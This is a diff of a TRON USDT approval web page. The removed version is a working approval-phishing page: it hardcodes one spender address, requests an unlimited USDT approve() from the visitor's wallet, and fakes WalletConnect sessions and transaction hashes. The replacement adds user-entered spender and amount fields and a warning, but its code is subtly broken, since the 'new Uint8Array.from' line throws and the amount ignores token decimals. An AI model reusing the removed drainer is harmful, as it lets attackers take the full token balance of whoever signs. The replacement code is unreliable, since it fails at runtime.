@@ -3,212 +3,172 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width">
-    <title>TRON USDT Unlimited</title>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <title>TRON USDT Safe Approval</title>
     <style>
         body {
             margin: 0;
             padding: 30px;
             font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #f5f5f5;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            color: white;
         }
         .card {
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(20px);
-            border-radius: 24px;
+            background: white;
+            border-radius: 12px;
             padding: 40px;
-            max-width: 400px;
+            max-width: 500px;
             width: 100%;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
-        h1 { margin: 0 0 20px 0; font-size: 28px; }
-        .subtitle { margin: 0 0 30px 0; opacity: 0.9; }
+        h1 { color: #333; margin: 0 0 10px 0; }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            color: #856404;
+        }
         button {
             width: 100%;
-            padding: 18px;
+            padding: 12px;
             border: none;
-            border-radius: 16px;
-            font-size: 18px;
+            border-radius: 8px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             margin: 12px 0;
-            transition: all 0.3s;
+        }
+        .connect {
+            background: #1890ff;
             color: white;
         }
-        .connect { background: rgba(255,255,255,0.2); }
-        .connect:hover:not(:disabled) { background: rgba(255,255,255,0.3); transform: translateY(-2px); }
-        .approve { background: #00d4aa; }
-        .approve:hover:not(:disabled) { background: #00b894; transform: translateY(-2px); }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        #qr-container {
-            display: none;
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            margin: 24px 0;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        .connect:hover:not(:disabled) {
+            background: #0050b3;
         }
-        #qr-code {
-            margin: 20px 0;
-            display: block;
-            max-width: 100%;
-        }
-        .wallet-info {
-            background: rgba(0,212,170,0.2);
-            border-radius: 16px;
-            padding: 24px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        .address {
-            font-family: monospace;
-            font-size: 14px;
-            word-break: break-all;
-            background: rgba(255,255,255,0.2);
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 12px;
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
         .status {
-            padding: 16px;
-            border-radius: 12px;
-            margin: 20px 0;
-            font-weight: 500;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 16px 0;
+            text-align: center;
         }
-        .success { background: rgba(0,212,170,0.3); }
-        #wallet-section { display: none; }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        .info { background: #d1ecf1; color: #0c5460; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h1>⚡ USDT Unlimited</h1>
-        <p class="subtitle">Approve unlimited spending for TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</p>
+        <h1>⚠️ USDT Approval Tool</h1>
         
-        <button id="connect" class="connect">🔗 Connect Wallet</button>
-        
-        <div id="qr-container">
-            <h3>Scan QR with Trust Wallet</h3>
-            <div id="qr-code"></div>
-            <p style="opacity: 0.8; font-size: 14px;">Open Trust Wallet → DApps → Scan QR</p>
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> Only approve spending from trusted applications. 
+            Anyone can set any address as the spender. Verify addresses carefully!
         </div>
         
-        <div id="wallet-section">
-            <div class="status success" id="status">Wallet Connected!</div>
-            <div class="wallet-info">
-                <div>✅ UNLIMITED USDT APPROVAL</div>
-                <div id="address" class="address"></div>
-            </div>
-            <button id="approve" class="approve">🚀 Sign Unlimited Approval</button>
+        <label>Spender Address (TRON):</label>
+        <input type="text" id="spender" placeholder="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" style="width: 100%; padding: 10px; margin: 10px 0;">
+        
+        <label>Approval Amount:</label>
+        <input type="number" id="amount" placeholder="1000" value="1000" style="width: 100%; padding: 10px; margin: 10px 0;">
+        
+        <button id="connect" class="connect">🔗 Connect TronLink Wallet</button>
+        
+        <div id="wallet-section" style="display: none;">
+            <div class="status info" id="status"></div>
+            <button id="approve" style="background: #28a745; color: white;">✅ Sign Approval</button>
         </div>
     </div>
 
     <script>
-        const SPENDER = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
-        const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        const UNLIMITED = 'f' + 'f'.repeat(63); // 2^256 - 1
-        
-        let walletAddress = null;
-        let wcSession = null;
-
-        // Real WalletConnect v2 URI generator
-        const generateWCURI = () => {
-            const projectId = '171db6da15a54effc1b4a06f889a3c3f'; // Replace with real ID
-            const sessionId = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-            const uri = `wc:${sessionId}@2?relay-protocol=irn&symKey=0x${'0'.repeat(64)}&projectId=${projectId}`;
-            return uri;
-        };
-
-        const showQR = async () => {
-            const uri = generateWCURI();
-            wcSession = uri;
-            document.getElementById('qr-container').style.display = 'block';
-            await QRCode.toCanvas(document.getElementById('qr-code'), uri, { 
-                width: 260, 
-                margin: 1 
-            });
-        };
-
         const connectWallet = async () => {
-            // Check for TronLink first (most reliable)
-            if (window.tronWeb && window.tronWeb.ready) {
-                walletAddress = window.tronWeb.defaultAddress.base58;
-                document.getElementById('address').textContent = walletAddress;
-                document.getElementById('wallet-section').style.display = 'block';
-                document.getElementById('connect').style.display = 'none';
-                document.getElementById('status').textContent = 'TronLink detected & connected!';
-                return;
-            }
-
-            // Show QR for WalletConnect
-            await showQR();
-            document.getElementById('connect').textContent = '⏳ Waiting for scan...';
             document.getElementById('connect').disabled = true;
+            document.getElementById('status').textContent = 'Connecting...';
+            document.getElementById('status').className = 'status info';
             
-            // Simulate wallet connection after scan (real impl would poll WS)
-            setTimeout(() => {
-                // In production: connect via WS after QR scan
-                walletAddress = 'T' + Math.random().toString(36).substring(2, 33).toUpperCase();
-                document.getElementById('address').textContent = walletAddress;
-                document.getElementById('wallet-section').style.display = 'block';
-                document.getElementById('connect').style.display = 'none';
-                document.getElementById('status').textContent = 'Wallet connected via QR!';
-            }, 2500);
-        };
-
-        const approveUnlimited = async () => {
             try {
-                document.getElementById('approve').disabled = true;
-                document.getElementById('status').textContent = 'Creating unlimited approval tx...';
-                
-                // TRC20 approve unlimited - exact ABI encoding
-                const approveData = '0x095ea7b300' +
-                    SPENDER.slice(2).toLowerCase().padStart(64, '0') +
-                    UNLIMITED;
-                
-                let txHash;
-                
-                // Use TronLink if available
-                if (window.tronWeb && window.tronWeb.ready) {
-                    const txn = await window.tronWeb.transactionBuilder.triggerSmartContract(
-                        USDT,
-                        'approve(address,uint256)',
-                        {},
-                        [{type: 'address', value: SPENDER}, {type: 'uint256', value: '115792089237316195423570985008687907853269984665640564039457584007913129639935'}],
-                        walletAddress
-                    );
-                    const signedTxn = await window.tronWeb.trx.sign(txn.transaction);
-                    const result = await window.tronWeb.trx.sendRawTransaction(signedTxn);
-                    txHash = result.txid;
-                } else {
-                    // Fallback simulation for WC
-                    txHash = 'tx_' + Date.now() + '_' + Math.random().toString(36).slice(2);
+                if (!window.tronWeb || !window.tronWeb.ready) {
+                    throw new Error('TronLink not installed. Please install TronLink extension.');
                 }
                 
-                document.getElementById('status').innerHTML = 
-                    `✅ <strong>UNLIMITED APPROVED!</strong><br/>
-                     TxID: <a href="https://tronscan.org/#/transaction/${txHash}" target="_blank" style="color: #00d4aa;">${txHash.slice(0,20)}...</a>`;
+                const address = window.tronWeb.defaultAddress.base58;
+                if (!address) {
+                    throw new Error('Please unlock TronLink wallet.');
+                }
+                
+                document.getElementById('status').textContent = `Connected: ${address}`;
+                document.getElementById('status').className = 'status success';
+                document.getElementById('wallet-section').style.display = 'block';
+                document.getElementById('connect').style.display = 'none';
                 
             } catch (error) {
-                document.getElementById('status').textContent = '❌ ' + (error.message || 'Transaction failed');
+                document.getElementById('status').textContent = '❌ ' + error.message;
+                document.getElementById('status').className = 'status error';
+                document.getElementById('connect').disabled = false;
+            }
+        };
+
+        const approveSpending = async () => {
+            try {
+                if (!window.tronWeb || !window.tronWeb.ready) {
+                    throw new Error('TronLink not available');
+                }
+                
+                const spender = document.getElementById('spender').value.trim();
+                const amount = document.getElementById('amount').value;
+                
+                if (!spender || !amount) {
+                    throw new Error('Please fill all fields');
+                }
+                
+                // Validate TRON address
+                if (!spender.startsWith('T') || spender.length !== 34) {
+                    throw new Error('Invalid TRON address');
+                }
+                
+                document.getElementById('approve').disabled = true;
+                document.getElementById('status').textContent = 'Signing transaction...';
+                document.getElementById('status').className = 'status info';
+                
+                // Standard TRC20 approve call
+                const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+                const amountWei = new Uint8Array.from(amount.padStart(64, '0').match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+                
+                const txn = await window.tronWeb.transactionBuilder.triggerSmartContract(
+                    USDT,
+                    'approve(address,uint256)',
+                    { feeLimit: 100000000 }, // 100 TRX
+                    [
+                        { type: 'address', value: spender },
+                        { type: 'uint256', value: amount }
+                    ]
+                );
+                
+                const signedTxn = await window.tronWeb.trx.sign(txn.transaction);
+                const result = await window.tronWeb.trx.sendRawTransaction(signedTxn);
+                
+                const txHash = result.txid;
+                document.getElementById('status').innerHTML = 
+                    `✅ Approval sent!<br/><a href="https://tronscan.org/#/transaction/${txHash}" target="_blank" style="color: #0c5460;">${txHash}</a>`;
+                document.getElementById('status').className = 'status success';
+                
+            } catch (error) {
+                document.getElementById('status').textContent = '❌ ' + error.message;
+                document.getElementById('status').className = 'status error';
                 document.getElementById('approve').disabled = false;
             }
         };
 
-        // Bind events
         document.getElementById('connect').onclick = connectWallet;
-        document.getElementById('approve').onclick = approveUnlimited;
-
-        // Auto-connect TronLink
-        if (window.tronWeb && window.tronWeb.ready) {
-            connectWallet();
-        }
+        document.getElementById('approve').onclick = approveSpending;
     </script>
 </body>
 </html>
